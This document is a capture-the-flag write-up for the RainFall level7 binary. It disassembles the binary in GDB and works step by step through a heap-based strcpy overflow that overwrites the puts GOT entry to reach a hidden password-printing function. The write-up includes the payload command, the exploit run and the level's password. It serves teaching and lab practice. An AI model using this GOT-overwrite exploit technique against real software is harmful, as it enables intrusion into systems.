# **Level7 - ASM Analysis (GDB only)**

## **Prerequisites for Exploitation**

Before performing any kind of exploitation, we assess the security mitigations in place for this binary.

### **1. Address Space Layout Randomization (ASLR)**

Check if ASLR is enabled:

```
level7@RainFall:~$ cat /proc/sys/kernel/randomize_va_space
0
```

A value of 0 means ASLR is disabled, memory addresses will remain consistent across executions, which simplifies our analysis.

### **2. Stack Protections**

Check protections with checksec:

```
level7@RainFall:~$ checksec --file ./level7
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./level7
```

**Interpretation:**

* No RELRO: no protection for GOT.
* No Canary: we can overwrite the stack freely.
* NX disabled: stack is executable, though unused here.
* No PIE: binary loads at a fixed address.

### **Conclusion**

The binary includes no modern protections. It is a perfect candidate for classic exploitation techniques. In this level, we will exploit a heap-based buffer overflow to overwrite a GOT entry by hijacking a pointer on the heap, redirecting execution to a hidden function that prints the password.

## **Disassembly Analysis**

This section provides a detailed analysis of the disassembled code for the `level7` binary using GDB. Each instruction is explained to understand the control flow, memory structure, and vulnerability.

---

## **Function Discovery**

We start by listing all functions in the binary:

```
(gdb) info functions
0x080484f4  m
0x08048521  main
```

We observe only two user-defined functions: `main()` and `m()`. Our analysis will focus on both. Interestingly, the `main()` function performs several heap allocations and unsafe operations, and the `m()` function appears to contain logic not normally triggered.

---

## **Disassembly of main()**

### **Function Prologue and Heap Setup**

```
0x08048521 <+0>:     push   %ebp
0x08048522 <+1>:     mov    %esp,%ebp
0x08048524 <+3>:     and    $0xfffffff0,%esp
0x08048527 <+6>:     sub    $0x20,%esp
```

<+0>: Save base pointer.  
<+1>: Create new stack frame.  
<+3>: Align ESP on a 16-byte boundary.  
<+6>: Reserve 32 bytes for local variables.  

### **Allocate structure A (8 bytes)**

```
0x0804852a <+9>:     movl   $0x8,(%esp)
0x08048531 <+16>:    call   0x80483f0 <malloc@plt>
0x08048536 <+21>:    mov    %eax,0x1c(%esp)
```

<+9>: Prepare call to malloc(8).  
<+16>: Allocate 8 bytes.  
<+21>: Store pointer to A in 0x1c(%esp).  

### **Set A\[0] = 1**

```
0x0804853a <+25>:    mov    0x1c(%esp),%eax
0x0804853e <+29>:    movl   $0x1,(%eax)
```

<+25>: Load pointer to A.  
<+29>: Write 1 to A\[0].  

### **Allocate A\[1] (8 bytes)**

```
0x08048544 <+35>:    movl   $0x8,(%esp)
0x0804854b <+42>:    call   0x80483f0 <malloc@plt>
0x08048550 <+47>:    mov    %eax,%edx
0x08048552 <+49>:    mov    0x1c(%esp),%eax
0x08048556 <+53>:    mov    %edx,0x4(%eax)
```

<+35>: Allocate 8 bytes.  
<+42>: malloc(8).  
<+47>: Store result in edx.  
<+49>: Load A.  
<+53>: Store result in A\[1].  

### **Allocate structure B (8 bytes)**

```
0x08048559 <+56>:    movl   $0x8,(%esp)
0x08048560 <+63>:    call   0x80483f0 <malloc@plt>
0x08048565 <+68>:    mov    %eax,0x18(%esp)
```

<+56>: Prepare malloc(8).  
<+63>: Allocate memory.  
<+68>: Save B pointer to 0x18(%esp).  

### **Set B\[0] = 2**

```
0x08048569 <+72>:    mov    0x18(%esp),%eax
0x0804856d <+76>:    movl   $0x2,(%eax)
```

<+72>: Load B pointer.  
<+76>: Write 2 to B\[0].  

### **Allocate B\[1] (8 bytes)**

```
0x08048573 <+82>:    movl   $0x8,(%esp)
0x0804857a <+89>:    call   0x80483f0 <malloc@plt>
0x0804857f <+94>:    mov    %eax,%edx
0x08048581 <+96>:    mov    0x18(%esp),%eax
0x08048585 <+100>:   mov    %edx,0x4(%eax)
```

<+82>: Allocate 8 bytes.  
<+89>: malloc(8).  
<+94>: Store result in edx.  
<+96>: Load B.  
<+100>: Store result in B\[1].  

### **Copy argv\[1] into A\[1] (strcpy)**

```
0x08048588 <+103>:   mov    0xc(%ebp),%eax
0x0804858b <+106>:   add    $0x4,%eax
0x0804858e <+109>:   mov    (%eax),%eax
0x08048590 <+111>:   mov    %eax,%edx
0x08048592 <+113>:   mov    0x1c(%esp),%eax
0x08048596 <+117>:   mov    0x4(%eax),%eax
0x08048599 <+120>:   mov    %edx,0x4(%esp)
0x0804859d <+124>:   mov    %eax,(%esp)
0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>
```

<+103>: Load pointer to argv.  
<+106>: Move to argv\[1].  
<+109>: Load user input string.  
<+111>: Copy to edx.  
<+113>: Load pointer to A.  
<+117>: Load A\[1].  
<+120>: Set argv\[1] as source.  
<+124>: Set A\[1] as destination.  
<+127>: Call strcpy(A\[1], argv\[1]).  
This is **vulnerable**, no bounds checking is done and may lead to heap overflow.

### **Copy argv\[2] into B\[1] (strcpy)**

```
0x080485a5 <+132>:   mov    0xc(%ebp),%eax
0x080485a8 <+135>:   add    $0x8,%eax
0x080485ab <+138>:   mov    (%eax),%eax
0x080485ad <+140>:   mov    %eax,%edx
0x080485af <+142>:   mov    0x18(%esp),%eax
0x080485b3 <+146>:   mov    0x4(%eax),%eax
0x080485b6 <+149>:   mov    %edx,0x4(%esp)
0x080485ba <+153>:   mov    %eax,(%esp)
0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>
```

<+132>: Load pointer to argv.  
<+135>: Move to argv\[2].  
<+138>: Load the actual string argument.  
<+140>: Store it in edx.  
<+142>: Load B structure pointer.  
<+146>: Load B\[1] from B.  
<+149>: Prepare argv\[2] as source.  
<+153>: Prepare B\[1] as destination.  
<+156>: Call strcpy(B\[1], argv\[2]).  
Same issue, unsafe copy.

### **Read password file and display**

```
0x080485c2 <+161>:   mov    $0x80486e9,%edx
0x080485c7 <+166>:   mov    $0x80486eb,%eax
0x080485cc <+171>:   mov    %edx,0x4(%esp)
0x080485d0 <+175>:   mov    %eax,(%esp)
0x080485d3 <+178>:   call   0x8048430 <fopen@plt>
```

<+161>: Load address of filename string into edx.  
<+166>: Load address of mode string ("r") into eax.  
<+171>: Set second argument (mode).  
<+175>: Set first argument (filename).  
<+178>: Call fopen("/home/user/level8/.pass", "r").  

```
0x080485d8 <+183>:   mov    %eax,0x8(%esp)
0x080485dc <+187>:   movl   $0x44,0x4(%esp)
0x080485e4 <+195>:   movl   $0x8049960,(%esp)
0x080485eb <+202>:   call   0x80483c0 <fgets@plt>
```

<+183>: Store the file pointer returned by fopen() into 0x8(%esp).  
<+187>: Set the size argument for fgets() to 0x44 (68 bytes).  
<+195>: Set the destination buffer address to 0x8049960.  
<+202>: Call fgets(buffer, 0x44, file) to read one line from the password file.  

```
0x080485f0 <+207>:   movl   $0x8048703,(%esp)
0x080485f7 <+214>:   call   0x8048400 <puts@plt>
```

<+207>: Load the address of the static debug string at 0x8048703 into the stack.  
<+214>: Call puts("\~\~")  

### **Function Epilogue**

```
0x080485fc <+219>:   mov    $0x0,%eax
0x08048601 <+224>:   leave
0x08048602 <+225>:   ret
```

<+219>: Set return value to 0.  
<+224>: Clean up stack frame.  
<+225>: Return to caller.  

---

## **Disassembly of m()**

```
0x080484f4 <+0>:     push   %ebp
0x080484f5 <+1>:     mov    %esp,%ebp
0x080484f7 <+3>:     sub    $0x18,%esp
```

<+0>: Save caller's base pointer.  
<+1>: Create a new stack frame.  
<+3>: Allocate 24 bytes of stack space.  

```
0x080484fa <+6>:     movl   $0x0,(%esp)
0x08048501 <+13>:    call   0x80483d0 <time@plt>
```

<+6>: Push NULL as the argument to time().  
<+13>: Call time(0) and store the result in eax (current timestamp).  

```
0x08048506 <+18>:    mov    $0x80486e0,%edx
0x0804850b <+23>:    mov    %eax,0x8(%esp)
0x0804850f <+27>:    movl   $0x8049960,0x4(%esp)
0x08048517 <+35>:    mov    %edx,(%esp)
0x0804851a <+38>:    call   0x80483b0 <printf@plt>
```

<+18>: Load address of format string "%s - %d " into edx.  
<+23>: Set second argument to current time value (eax).  
<+27>: Load address of buffer c (where fgets wrote) into 0x4(%esp).  
<+35>: Set first argument (format string) in esp.  
<+38>: Call printf("%s - %d", c, time).  

```
0x0804851f <+43>:    leave
0x08048520 <+44>:    ret
```

<+43>: Restore stack and base pointer.  
<+44>: Return to caller function.  

---

## **Conclusion**

This function creates and initializes two heap objects A and B, then copies argv\[1] and argv\[2] unsafely into their respective internal buffers. These operations are vulnerable to overflow. The `m()` function, though never called directly, prints the content of the buffer containing the password. By overflowing one of the heap allocations and overwriting the right address, we can hijack execution to call `m()` and print the flag.

## GDB Runtime Analysis

This section documents the dynamic analysis of the level7 binary using GDB. The objective is to understand the memory layout, confirm the vulnerability, and demonstrate the full exploitation process step-by-step.

---

### Step 1: List Functions and Confirm Entry Points

We start by listing the functions defined in the binary:

```
(gdb) info functions
0x080484f4 m
0x08048521 main
```

Function `main()` is the program's entry point. The function `m()` is not called in the normal flow but prints the password and a timestamp. We aim to redirect execution to `m()`.

---

### Step 2: Locate the Target GOT Entry

We want to hijack the GOT entry for `puts()`, which is called at the end of `main()`:

```
(gdb) disas puts
Dump of assembler code for function puts@plt:
=> 0x08048400 <+0>: jmp *0x8049928
```

This confirms the GOT entry for `puts()` is:

```
0x08049928
```

Overwriting this pointer will allow us to divert control flow to our target function.

---

### Step 3: Get the Address of m()

We locate the address of the hidden function `m()`:

```
(gdb) p m
$1 = {<text variable, no debug info>} 0x080484f4 <m>
```

We will overwrite the GOT entry of `puts()` with this value.

---

### Step 4: Inspect the Heap Layout

We analyze the heap layout to understand how an overflow in one structure can corrupt the next.

From the disassembly of `main()`:

```
0x08048536: mov %eax, 0x1c(%esp) ; a = malloc(8)
0x08048565: mov %eax, 0x18(%esp) ; b = malloc(8)
```

So:

* pointer `a` is stored at `[esp + 0x1c]`
* pointer `b` is stored at `[esp + 0x18]`

We break before the second `strcpy()` (i.e., before the overflow happens):

```
(gdb) break *0x080485bd
(gdb) run AAAA BBBB
```

#### Step 4.1 – Recover addresses of `a` and `b`

```
(gdb) print $esp
$1 = (void *) 0xbffff6e0

(gdb) x/wx $esp + 0x1c
0xbffff6fc: 0x0804a008 ← a

(gdb) x/wx $esp + 0x18
0xbffff6f8: 0x0804a028 ← b
```

#### Step 4.2 – Dump memory contents of `a` and `b`

```
(gdb) x/4wx 0x0804a008
0x804a008: 0x00000001 0x0804a018 0x00000000 0x0804a038
```

Interpretation:

* `a[0] = 1` → unused
* `a[1] = 0x0804a018` → buffer for `argv[1]`
* `b[0] = 0`
* `b[1] = 0x0804a038` → buffer for `argv[2]` (will be overwritten)

We now **confirm visually** that `b[1]` lives at `0x0804a02c`:

```
(gdb) x/xw 0x0804a028 + 4
0x804a02c: 0x0804a038 ← b[1]
```

#### Step 4.3 – Compute the overflow offset

The overflow starts from the buffer at `a[1] = 0x0804a018`, and reaches `b[1] = 0x0804a02c`.

```
(gdb) print 0x0804a02c - 0x0804a018
$2 = 20
```

**Overflow offset = 20 bytes.**

This confirms that a 20-byte input into `a[1]` is required to reach and overwrite the pointer `b[1]`, which will later be dereferenced by the second `strcpy()`, giving us a write-what-where primitive.

---

### Step 5: Exploit the Overwrite with Controlled Pointers

We now construct the payload:

* `argv[1]`: 20 bytes padding + address of `puts()` GOT entry
* `argv[2]`: address of `m()`

In Bash:

```
export A=$(python -c 'print("A" * 20 + "\x28\x99\x04\x08")')
export B=$(python -c 'print("\xf4\x84\x04\x08")')
```

To validate this in GDB, set a breakpoint just before the final `puts()` call:

```
(gdb) break *0x080485f7
(gdb) run "$A" "$B"
```

Then confirm that the GOT entry has been overwritten:

```
(gdb) x/wx 0x08049928
0x8049928 <puts@got.plt>:       0x080484f4
```

The GOT entry for `puts()` now points to `m()`.

---

### Step 6: Trigger m() and Print the Password

Run the final exploit:

```
level7@RainFall:~$ ./level7 "$A" "$B"
```

Program output:

```
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1754492460
```

Execution was successfully redirected to `m()`, which printed the password.

---

### Conclusion

This GDB session confirms that the `level7` binary is vulnerable to a heap-based buffer overflow. By overflowing `a[1]`, we overwrite `b[1]` with the address of the GOT entry for `puts()`. The second `strcpy()` then writes the address of `m()` into the GOT, and the final `puts()` call is redirected to `m()`.

**Key Findings:**

* Overflow offset: **20 bytes**
* GOT target: **0x08049928** (`puts`)
* Function to hijack to: **0x080484f4** (`m`)

